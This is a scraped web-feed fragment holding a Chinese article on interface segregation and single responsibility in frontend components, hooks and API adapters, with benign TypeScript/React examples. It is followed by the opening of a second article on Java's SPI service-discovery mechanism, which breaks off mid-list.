pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>这是《前端像架构突围》系列的第六篇。</p>
<p>在上一篇我们聊了 <code>契约继承原则</code>
，今天我们把显微镜聚焦得更细一点，聊聊**“接口”**。</p>
<p>很多同学看到“接口职责单一”和“接口隔离”，第一反应是：跟我前端切图有什么关系？”</p>
<p>关系大了。你是否经历过一个 <code>Table</code> 组件写了 30 多个 props？你是否见过一个 <code>useCommon</code> Hook 里塞进了登录、埋点、弹窗和格式化逻辑？</p>
<p>前端的**“腐烂” <strong>，往往不是因为技术栈落后，而是因为</strong>接口设计的边界模糊**。今天我们不谈枯燥的 SOLID 定义，只谈在前端组件、Hooks 和数据层设计中，如何利用**“隔离”**思维，从根本上消灭“上帝组件”。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8f69cc278004c119287ec0dbe2233ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875490&amp;x-signature=97LOto4pwsn8HcqUvdTEv%2BPgph0%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">一、 前端视角的“接口”究竟是什么？</h3>
<p>在架构师的眼里，前端的 Interface 绝不仅仅是 TypeScript 里的 <code>interface Props {}</code>。</p>
<p><strong>前端的“接口”，是模块与外界通信的全部契约。</strong> 它包含三个维度：</p>
<ol>
<li><strong>数据契约</strong>：组件的 Props、Vue 的 Emits、以及后端返回的 JSON 结构。</li>
<li><strong>逻辑契约</strong>：Hooks (Composables) 暴露出的 value 和 function。</li>
<li><strong>交互契约</strong>：组件通过 ref 暴露给父组件的实例方法（如 <code>modalRef.open()</code>）。</li>
</ol>
<p><strong>“职责单一”与“隔离”的核心目标只有一个：降低耦合，控制变化的影响范围。</strong></p>
<p>如果你的组件因为“UI调整”要改，因为“后端字段更名”要改，甚至因为“埋点库升级”也要改，那这个组件就成了**“变化磁铁”**，它违反了单一职责，迟早会崩塌。</p>
<hr/>
<h3 data-id="heading-1">二、那些违反 ISP (接口隔离原则) 的反模式</h3>
<p>我们先来看一个典型的“车祸现场”。这是一个展示用户信息的卡片组件。</p>
<h4 data-id="heading-2">反模式 1：全量依赖（贪婪接口）</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 类型定义：后端返回的完整的用户数据模型</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">role</span>: <span class="hljs-string">'admin'</span> | <span class="hljs-string">'user'</span>;
  <span class="hljs-attr">settings</span>: { <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">notify</span>: <span class="hljs-built_in">boolean</span> };
  <span class="hljs-comment">// ... 可能还有20个字段</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserCardProps</span> {
  <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span>; <span class="hljs-comment">//  罪魁祸首：直接依赖整个 User 对象</span>
  <span class="hljs-attr">onEdit</span>: <span class="hljs-function">(<span class="hljs-params">u: User</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">UserCard</span> = (<span class="hljs-params">{ user, onEdit }: UserCardProps</span>) =&gt; {
  <span class="hljs-comment">// 组件其实只用到了 avatar 和 name</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> onEdit(user)}&gt;Edit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>为什么这是架构上的坏味道？</strong></p>
<ol>
<li><strong>语义污染</strong>：<code>UserCard</code> 本质上只需要“图片”和“名字”。如果你强制传入整个 <code>User</code> 对象，导致我在“好友列表”里复用这个组件时，必须构造一个假的 <code>User</code> 对象（这就叫 mocking hell）。</li>
<li><strong>不必要的重渲染</strong>：如果 <code>User</code> 对象里的 <code>settings.theme</code> 变了，<code>UserCard</code> 会感知到 props 变化从而 re-render，尽管它根本不在乎 theme。</li>
<li><strong>类型系统的脆弱性</strong>：后端如果把 <code>email</code> 字段删了，虽然 <code>UserCard</code> 没用到 email，但 TypeScript 可能会在父组件传参处报错，因为类型契约断了。</li>
</ol>
<h4 data-id="heading-3">破局方案：按需声明（最小知识原则）</h4>
<p>架构师的解法是：<strong>组件不应该依赖它不需要的东西。</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 定义组件真正关心的接口（ISP）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserCardProps</span> {
  <span class="hljs-attr">avatarUrl</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">displayName</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">onEdit</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>; <span class="hljs-comment">// 甚至不需要回传 User，由父组件闭包处理</span>
}

<span class="hljs-comment">// 2. 只有 UI 关注点</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">UserCard</span> = (<span class="hljs-params">{ avatarUrl, displayName, onEdit }: UserCardProps</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{avatarUrl}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{displayName}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onEdit}</span>&gt;</span>Edit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// 3. 在父组件层进行“适配”</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Parent</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: user } = <span class="hljs-title function_">useUser</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserCard</span> 
      <span class="hljs-attr">avatarUrl</span>=<span class="hljs-string">{user.avatar}</span>
      <span class="hljs-attr">displayName</span>=<span class="hljs-string">{user.name}</span>
      <span class="hljs-attr">onEdit</span>=<span class="hljs-string">{()</span> =&gt;</span> handleEdit(user.id)}
    /&gt;</span>
  );
};
</code></pre>
<p><strong>架构收益：</strong> <code>UserCard</code> 从“特定业务组件”进化成了“通用 UI 组件”。现在它可以展示“当前用户”，也可以展示“推荐好友”，甚至可以展示“宠物信息”（只要有图和名字）。</p>
<hr/>
<h3 data-id="heading-4">三、配置地狱 vs 组合隔离</h3>
<p>另一种常见的违反“职责单一”的场景，出现在<strong>通用组件</strong>的设计上。</p>
<p>为了复用，我们经常往组件里加 flag。</p>
<h4 data-id="heading-5">反模式 2：上帝组件（God Component）</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 一个试图满足所有人的 List 组件</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListProps</span> {
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span>[];
  <span class="hljs-comment">//  职责混乱：既负责渲染列表，又负责头部，又负责搜索，又负责分页</span>
  showSearch?: <span class="hljs-built_in">boolean</span>;
  searchPlaceholder?: <span class="hljs-built_in">string</span>;
  onSearch?: <span class="hljs-function">(<span class="hljs-params">val: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  showPagination?: <span class="hljs-built_in">boolean</span>;
  total?: <span class="hljs-built_in">number</span>;
  renderHeader?: <span class="hljs-built_in">boolean</span>;
  headerTitle?: <span class="hljs-built_in">string</span>;
  <span class="hljs-comment">// ... props 爆炸</span>
}
</code></pre>
<p>随着业务迭代，这个组件内部会充斥着 <code>if (showSearch) { ... }</code> 的判断。每次修改任何一个小逻辑，都要小心翼翼防止改坏了其他功能。</p>
<h4 data-id="heading-6">破局方案：组合优于配置 (Composition over Configuration)</h4>
<p>我们要利用 React/Vue 的 <strong>Slot (插槽)</strong> 或 <strong>Children</strong> 机制，将职责隔离给外部。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 职责单一：List 只管渲染列表</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">List</span> = (<span class="hljs-params">{ children }</span>) =&gt; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list"</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
<span class="hljs-title class_">List</span>.<span class="hljs-property">Item</span> = <span class="hljs-function">(<span class="hljs-params">{ title }</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item"</span>&gt;</span>{title}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;

<span class="hljs-comment">// 职责单一：Search 只管搜索</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">SearchBar</span> = (<span class="hljs-params">{ onSearch }</span>) =&gt; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{...}</span> /&gt;</span></span>;

<span class="hljs-comment">// 业务层：自由组合</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">UserListFeature</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"container"</span>&gt;</span>
      {/* 搜索职责隔离 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">SearchBar</span> <span class="hljs-attr">onSearch</span>=<span class="hljs-string">{handleSearch}</span> /&gt;</span>
      
      {/* 列表职责隔离 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">List</span>&gt;</span>
        {users.map(u =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">List.Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{u.id}</span> <span class="hljs-attr">title</span>=<span class="hljs-string">{u.name}</span> /&gt;</span>
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">List</span>&gt;</span>
      
      {/* 分页职责隔离 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Pagination</span> <span class="hljs-attr">total</span>=<span class="hljs-string">{100}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>架构收益：</strong></p>
<ul>
<li><strong>List 组件</strong> 不再需要知道“搜索”的存在。</li>
<li><strong>SearchBar 组件</strong> 可以单独优化、单独复用。</li>
<li>如果哪天产品经理说“把搜索框放到列表底部”，你只需要调整 JSX 的顺序，而不需要去修改 <code>List</code> 组件内部那复杂的 <code>if/else</code> 渲染逻辑。</li>
</ul>
<hr/>
<h3 data-id="heading-7">四、Hooks 与逻辑层的职责隔离</h3>
<p>UI 隔离大家多少有点概念，但逻辑层的隔离往往是重灾区。我们经常看到一个 <code>useTable</code> 承担了所有工作。</p>
<h4 data-id="heading-8">混杂逻辑</h4>
<pre><code class="hljs language-scss" lang="scss">const useTable = (apiEndpoint) =&gt; {
  <span class="hljs-comment">// 1. 数据获取</span>
  const <span class="hljs-selector-attr">[data, setData]</span> = <span class="hljs-built_in">useState</span>([]);
  
  <span class="hljs-comment">// 2. 分页状态</span>
  const <span class="hljs-selector-attr">[page, setPage]</span> = <span class="hljs-built_in">useState</span>(<span class="hljs-number">1</span>);
  
  <span class="hljs-comment">// 3. 筛选逻辑</span>
  const <span class="hljs-selector-attr">[filters, setFilters]</span> = <span class="hljs-built_in">useState</span>({});
  
  <span class="hljs-comment">// 4. URL 同步逻辑 (副作用)</span>
  <span class="hljs-built_in">useEffect</span>(() =&gt; {
     history<span class="hljs-selector-class">.push</span>(`?page=${page}`);
  }, <span class="hljs-selector-attr">[page]</span>);
  
  <span class="hljs-comment">// 5. 甚至还有 Excel 导出逻辑</span>
  const exportExcel = () =&gt; { ... };

  return { data, page, setPage, exportExcel, ... };
}
</code></pre>
<p>这违反了 SRP。如果你只想换个 URL 同步库（比如从 react-router 换到 next/router），你得去改这个核心 Hook，风险极大。</p>
<h4 data-id="heading-9">逻辑拆分与组装 (Headless 思想)</h4>
<p>好的架构应该是<strong>积木式</strong>的：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 纯粹的分页逻辑 (无副作用)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">usePagination</span> = (<span class="hljs-params">initialPage = <span class="hljs-number">1</span></span>) =&gt; { ... };

<span class="hljs-comment">// 2. 纯粹的数据请求 (不关心 UI)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useFetchData</span> = (<span class="hljs-params">params</span>) =&gt; { ... };

<span class="hljs-comment">// 3. 独立的 URL 同步逻辑</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useUrlSync</span> = (<span class="hljs-params">state</span>) =&gt; { ... };

<span class="hljs-comment">// 4. 业务层 Hook：负责组装 (Orchestration)</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useUserTableLogic</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { page, setPage } = <span class="hljs-title function_">usePagination</span>();
  <span class="hljs-keyword">const</span> { filters } = <span class="hljs-title function_">useFilters</span>();
  
  <span class="hljs-comment">// 组装逻辑：当 page 变了，去请求数据</span>
  <span class="hljs-keyword">const</span> { data, loading } = <span class="hljs-title function_">useFetchData</span>({ page, ...filters });
  
  <span class="hljs-comment">// 组装副作用：状态变了同步 URL</span>
  <span class="hljs-title function_">useUrlSync</span>({ page, filters });
  
  <span class="hljs-keyword">return</span> { data, loading, page, setPage };
};
</code></pre>
<p><strong>架构收益：</strong> * <code>usePagination</code> 可以被任何列表、轮播图复用。</p>
<ul>
<li>测试 <code>usePagination</code> 不需要 mock API 请求。</li>
<li>修改 URL 同步逻辑不会影响数据请求逻辑。</li>
</ul>
<hr/>
<h3 data-id="heading-10">五、数据接口的终极隔离 (ACL)</h3>
<p>最后一个关键点是<strong>前端与后端的接口隔离</strong>。</p>
<p>很多前端项目直接在组件里使用后端的字段名：</p>
<pre><code class="hljs language-css" lang="css">// 糟糕的代码：UI 深度耦合后端字段
&lt;<span class="hljs-selector-tag">div</span>&gt;{data<span class="hljs-selector-class">.user_real_name_v2</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;
&lt;<span class="hljs-selector-tag">div</span>&gt;{data<span class="hljs-selector-class">.is_vip_flag</span> === <span class="hljs-number">1</span> ? 'VIP' : <span class="hljs-string">'Normal'</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<p>如果后端重构，把 <code>user_real_name_v2</code> 改成了 <code>realName</code>，把 <code>is_vip_flag</code> 改成了布尔值，你的项目里可能有 50 个文件要跟着改。</p>
<p><strong>架构突围方案：引入 Adapter（适配器）层。</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// api/user.ts</span>
<span class="hljs-comment">// 定义前端需要的纯净 Model</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserModel</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">isVip</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-comment">// 适配器：将后端脏数据清洗为前端标准数据</span>
<span class="hljs-keyword">const</span> adaptUser = (<span class="hljs-attr">serverData</span>: <span class="hljs-built_in">any</span>): <span class="hljs-function"><span class="hljs-params">UserModel</span> =&gt;</span> ({
  <span class="hljs-attr">name</span>: serverData.<span class="hljs-property">user_real_name_v2</span> || serverData.<span class="hljs-property">name</span>, <span class="hljs-comment">// 甚至可以做兼容</span>
  <span class="hljs-attr">isVip</span>: serverData.<span class="hljs-property">is_vip_flag</span> === <span class="hljs-number">1</span>
});

<span class="hljs-comment">// 组件层只消费 UserModel，完全不知道 serverData 的存在</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">UserProfile</span> = (<span class="hljs-params">{ user }: { user: UserModel }</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name} - {user.isVip ? 'VIP' : ''}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
};
</code></pre>
<p>这就是**“数据接口隔离”**。无论后端怎么变，变化只止步于 <code>adaptUser</code> 函数，UI 层稳如泰山。</p>
<hr/>
<h3 data-id="heading-11">六、 总结与思考</h3>
<p>在《前端像架构突围》的语境下， <strong>“接口职责单一隔离”不仅仅是代码洁癖，它是应对系统复杂度的核心手段。</strong></p>
<ul>
<li><strong>对 Props 隔离</strong>：让组件更通用，减少无谓渲染。</li>
<li><strong>对 Children 隔离</strong>：用组合代替配置，消灭上帝组件。</li>
<li><strong>对 Hooks 隔离</strong>：逻辑解耦，提升可测试性。</li>
<li><strong>对 API 隔离</strong>：建立防腐层，保护前端代码的稳定性。</li>
</ul>
<p><strong>下一步行动建议：</strong> 现在打开你项目里的 <code>components</code> 文件夹，找出一个 Props 超过 10 个的组件，或者一个代码行数超过 300 行的 Hook。试着问自己： <em>“这个模块是不是承担了太多的职责？”</em> ，然后尝试用本文提到的“按需声明”或“组合模式”进行一次重构。</p>
<p>架构能力的提升，就发生在这一次次对“边界”的重新审视中。</p>
<hr/>
<blockquote>
<p><strong>互动话题</strong></p>
<p>在业务中更新迭代过快时, 可以不去关心这些东西, 但这些东西的输出, 更多的是要去转变你的思维, 让你有一个概念、印象这是一个潜移默化的转变过程, 让你看问题、看框架时、看业务时, 能站在上一层。</p>
<blockquote>
</blockquote>
<p>你的项目中是否也有那种“改一行代码，整个页面都崩了”的祖传组件？欢迎在评论区分享你的“屎山”重构血泪史！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SPI机制：服务扩展的核心技术]]></title>    <link>https://juejin.cn/post/7594415509607333934</link>    <guid>https://juejin.cn/post/7594415509607333934</guid>    <pubDate>2026-01-13T06:08:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594415509607333934" data-draft-id="7593602686136139802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" SPI机制：服务扩展的核心技术"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-13T06:08:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             SPI机制：服务扩展的核心技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T06:08:48.000Z" title="Tue Jan 13 2026 06:08:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">为什么需要SPI机制</h2>
<h3 data-id="heading-1">SPI和API的区别是什么</h3>
<p>SPI是一种跟API相对应的反向设计思想：API由实现方确定标准规范和功能，调用方无权做任何干预； 而SPI是由调用方确定标准规范，也就是接口，然后调用方依赖此接口，第三方实现此接口，这样做就可以方便的进行扩展，类似于插件机制，这是SPI出现的需求背景。</p>
<p>SPI ： “接口”位于“调用方”所在的“包”中</p>
<ul>
<li>
<p>概念上更依赖调用方。</p>
</li>
<li>
<p>组织上位于调用方所在的包中。</p>
</li>
<li>
<p>实现位于独立的包中。</p>
</li>
<li>
<p>常见的例子是：插件模式的插件。</p>
</li>
</ul>
<p>API ： “接口”位于“实现方”所在的“包”中</p>
<ul>
<li>
<p>概念上更接近实现方。</p>
</li>
<li>
<p>组织上位于实现方所在的包中。</p>
</li>
<li>
<p>实现和接口在一个包中。</p>
</li>
</ul>
<h3 data-id="heading-2">什么是SPI机制</h3>
<p>SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，例如数据库中的java.sql.Driver接口，不同的厂商可以针对同一接口做出不同的实现，如下图所示，MySQL和PostgreSQL都有不同的实现提供给用户。
而Java的SPI机制可以为某个接口寻找服务实现，Java中SPI机制主要思想是<strong>将装配的控制权移到程序之外</strong>，在模块化设计中这个机制尤其重要，其核心思想就是 <strong>解耦</strong>。</p>
<p>SPI整体机制图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc39590bdd5d40ecab1192c3011a2f44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889327&amp;x-signature=0gTdm9ZMzo22fG4%2F%2FBO4BcWZnzk%3D" alt="" loading="lazy"/></p>
<ol>
<li>当服务的提供者提供了一种接口的实现之后，需要在classpath下的 META-INF/services/ 目录里创建一个文件，文件名是以<strong>服务接口</strong>命名的，而文件里的内容是这个接口的<strong>具体的实现类</strong>。</li>
